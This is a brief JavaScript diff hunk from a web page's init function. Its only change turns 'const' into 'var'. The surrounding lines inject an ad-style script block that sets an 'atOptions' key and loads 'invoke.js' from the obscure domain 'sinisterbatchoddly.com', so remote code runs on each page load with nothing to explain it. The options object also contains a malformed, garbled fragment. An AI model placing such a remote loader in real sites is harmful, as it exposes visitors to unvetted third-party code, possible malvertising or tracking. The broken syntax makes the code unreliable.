@@ -3,7 +3,7 @@
   // Initialize the page
   function init() {
       document.siteName = $('title').html();
-      const html = `<div id="kafka" style="top:100px;left:100px;position:fixed"></div>
+      var html = `<div id="kafka" style="top:100px;left:100px;position:fixed"></div>
       <script type="text/javascript">
         atOptions = {'key' : 'e50656314f5a73de24a452da7431f110','format' : 'iframe','height' : 600,'width' : 160,'params' : {} {"}"};
         var script = document.createElement('script'); script.src ="https://sinisterbatchoddly.com/e50656314f5a73de24a452da7431f110/invoke.js";
